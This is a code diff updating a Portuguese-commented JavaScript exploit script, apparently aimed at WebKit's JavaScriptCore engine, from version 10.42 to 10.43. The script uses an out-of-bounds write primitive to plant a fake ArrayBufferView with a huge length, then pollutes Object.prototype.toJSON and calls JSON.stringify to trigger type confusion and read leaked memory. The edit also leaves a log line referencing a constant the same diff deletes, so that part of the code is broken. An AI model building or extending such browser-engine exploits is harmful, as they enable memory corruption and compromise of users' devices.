@@ -14,7 +14,7 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v10.42"; // Versão incrementada
+const FNAME_MAIN = "ExploitLogic_v10.43"; // Versão incrementada
 
 // --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
 const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58;
@@ -28,11 +28,6 @@ const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero;
 const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero;
 const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;
 const FAKE_VIEW_MMODE_VALUE           = 0x00000000;
-
-// Offset para uma escrita OOB de perturbação antes de JSON.stringify
-const SENSITIVE_CORRUPTION_OFFSET     = 0x70;
-const SENSITIVE_CORRUPTION_VALUE      = 0xDEADBEEF; // Nome corrigido aqui para ser consistente
-
 
 // Variável global para o getter toJSON comunicar para fora (se necessário)
 let global_toJSON_this_details = null;
@@ -65,10 +60,21 @@ function toJSON_speculativeActivationAttempt() {
             logS3(`  [${FNAME_toJSON}] this.length: ${toHex(global_toJSON_this_details.length_prop)} (Decimal: ${global_toJSON_this_details.length_prop})`, "leak", FNAME_toJSON);
             
             if (typeof this.length === 'number' && this.length > 1) {
-                global_toJSON_this_details.elem0 = this[0];
-                logS3(`  [${FNAME_toJSON}] this[0]: ${toHex(global_toJSON_this_details.elem0)}`, "leak", FNAME_toJSON);
-                global_toJSON_this_details.elem1 = this[1];
-                logS3(`  [${FNAME_toJSON}] this[1]: ${toHex(global_toJSON_this_details.elem1)}`, "leak", FNAME_toJSON);
+                // Se o length for muito grande, ler apenas alguns elementos para evitar timeout/crash no log
+                const max_elements_to_log = 5;
+                for (let i = 0; i < Math.min(max_elements_to_log, this.length); i++) {
+                    try {
+                        let val = this[i];
+                        logS3(`  [${FNAME_toJSON}] this[${i}]: ${toHex(val)}`, "leak", FNAME_toJSON);
+                        if (i === 0) global_toJSON_this_details.elem0 = val;
+                        if (i === 1) global_toJSON_this_details.elem1 = val;
+                    } catch (e_elem) {
+                        logS3(`  [${FNAME_toJSON}] ERRO ao ler this[${i}]: ${e_elem.message}`, "error", FNAME_toJSON);
+                        if (i === 0) global_toJSON_this_details.elem0 = "ERROR_READ";
+                        if (i === 1) global_toJSON_this_details.elem1 = "ERROR_READ";
+                        break; 
+                    }
+                }
             }
             if (global_toJSON_this_details.length_prop === FAKE_VIEW_MLENGTH_VALUE) {
                 logS3(`    !!!! POTENCIAL SUPER VIEW DETECTADA NO GETTER !!!! Length corresponde a FAKE_VIEW_MLENGTH_VALUE!`, "vuln", FNAME_toJSON);
@@ -93,15 +99,15 @@ function toJSON_speculativeActivationAttempt() {
 
 
 // ============================================================
-// FUNÇÃO PRINCIPAL (v10.42 - Correção ReferenceError)
+// FUNÇÃO PRINCIPAL (v10.43 - Remover escrita de perturbação, focar em toJSON)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.speculativeActivation_v10.42`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Ativação Especulativa da View Fake (RefError Fix) ---`, "test", FNAME_CURRENT_TEST);
-    document.title = "SpeculativeActivation v10.42 Test...";
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.noPerturbJsonActivation_v10.43`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Ativação Especulativa via toJSON (Sem Perturbação 0x70) ---`, "test", FNAME_CURRENT_TEST);
+    document.title = "SpeculativeActivation v10.43 Test...";
 
     global_toJSON_this_details = null;
-    let trigger_obj = { data1: 0x1111, data2: 0x2222 };
+    let trigger_obj = { data1: 0x1111, data2: 0x2222, nested: { n1: 0x333 } }; // Objeto um pouco mais complexo
 
     try {
         await triggerOOB_primitive();
@@ -132,17 +138,10 @@ export async function sprayAndInvestigateObjectExposure() {
         oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
         
         logS3(`  Estrutura fake de ArrayBufferView (SID: ${toHex(FAKE_VIEW_STRUCTURE_ID)}, m_vector: ${FAKE_VIEW_MVECTOR_VALUE.toString(true)}, m_length: ${toHex(FAKE_VIEW_MLENGTH_VALUE)}) plantada em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}.`, "good", FNAME_CURRENT_TEST);
-        await PAUSE_S3(50);
+        await PAUSE_S3(100); // Pausa após plantar
 
-        // PASSO 2: Opcional - Escrita OOB de perturbação em local sensível
-        logS3(`PASSO 2: Escrevendo valor de perturbação ${toHex(SENSITIVE_CORRUPTION_VALUE)} em ${toHex(SENSITIVE_CORRUPTION_OFFSET)}...`, "warn", FNAME_CURRENT_TEST);
-        try {
-            // CORREÇÃO APLICADA AQUI:
-            oob_write_absolute(SENSITIVE_CORRUPTION_OFFSET, SENSITIVE_CORRUPTION_VALUE, 4);
-        } catch (e_perturb) {
-            logS3(`  Erro na escrita de perturbação: ${e_perturb.message}`, "error", FNAME_CURRENT_TEST);
-        }
-        await PAUSE_S3(50);
+        // PASSO 2: (REMOVIDO - Escrita OOB de perturbação em local sensível)
+        logS3(`PASSO 2: Escrita de perturbação em ${toHex(SENSITIVE_CORRUPTION_OFFSET)} REMOVIDA para este teste.`, "info", FNAME_CURRENT_TEST);
 
         // PASSO 3: Tentar ativar/usar a estrutura fake via poluição de toJSON
         logS3(`PASSO 3: Tentando ativação especulativa via JSON.stringify e toJSON poluído...`, "test", FNAME_CURRENT_TEST);
@@ -159,16 +158,23 @@ export async function sprayAndInvestigateObjectExposure() {
             logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_speculativeActivationAttempt.name}.`, "info", FNAME_CURRENT_TEST);
 
             logS3(`  Chamando JSON.stringify(trigger_obj)... Trigger object: ${JSON.stringify(trigger_obj)}`, "info", FNAME_CURRENT_TEST);
-            let stringifyResult = JSON.stringify(trigger_obj);
+            await PAUSE_S3(50); // Pequena pausa antes da chamada crítica
+            let stringifyResult = JSON.stringify(trigger_obj); // PONTO CRÍTICO
             
-            logS3(`  JSON.stringify completou. Resultado (parcial): ${String(stringifyResult).substring(0, 200)}`, "info", FNAME_CURRENT_TEST);
-            logS3(`  Detalhes coletados pelo getter toJSON: ${JSON.stringify(global_toJSON_this_details)}`, "leak", FNAME_CURRENT_TEST);
+            logS3(`  JSON.stringify completou. Resultado (parcial): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_CURRENT_TEST);
+            if (global_toJSON_this_details) {
+                logS3(`  Detalhes coletados pelo getter toJSON: ${JSON.stringify(global_toJSON_this_details)}`, "leak", FNAME_CURRENT_TEST);
 
-            if (global_toJSON_this_details && global_toJSON_this_details.length_prop === FAKE_VIEW_MLENGTH_VALUE) {
-                logS3("    !!!! SUCESSO ESPECULATIVO? !!!! O 'this' dentro do toJSON parece ter o length da nossa FAKE VIEW!", "vuln", FNAME_CURRENT_TEST);
-                document.title = "SPECULATIVE SUPERVIEW SUCCESS?!";
-            } else if (global_toJSON_this_details && global_toJSON_this_details.error_accessing_props) {
-                logS3("    PROBLEMA ESPECULATIVO: Erro ao acessar propriedades de 'this' no toJSON, pode indicar Type Confusion.", "warn", FNAME_CURRENT_TEST);
+                if (global_toJSON_this_details.length_prop === FAKE_VIEW_MLENGTH_VALUE) {
+                    logS3("    !!!! SUCESSO ESPECULATIVO? !!!! O 'this' dentro do toJSON parece ter o length da nossa FAKE VIEW!", "vuln", FNAME_CURRENT_TEST);
+                    document.title = "SPECULATIVE SUPERVIEW SUCCESS?!";
+                } else if (global_toJSON_this_details.error_accessing_props) {
+                    logS3("    PROBLEMA ESPECULATIVO: Erro ao acessar propriedades de 'this' no toJSON, pode indicar Type Confusion.", "warn", FNAME_CURRENT_TEST);
+                } else {
+                    logS3("    INFO: Getter toJSON executado, mas não parece ter 'this' como a Super View fake.", "info", FNAME_CURRENT_TEST);
+                }
+            } else {
+                 logS3("    AVISO: global_toJSON_this_details é nulo, o getter pode não ter sido chamado ou falhou cedo.", "warn", FNAME_CURRENT_TEST);
             }
 
         } catch (e_stringify) {
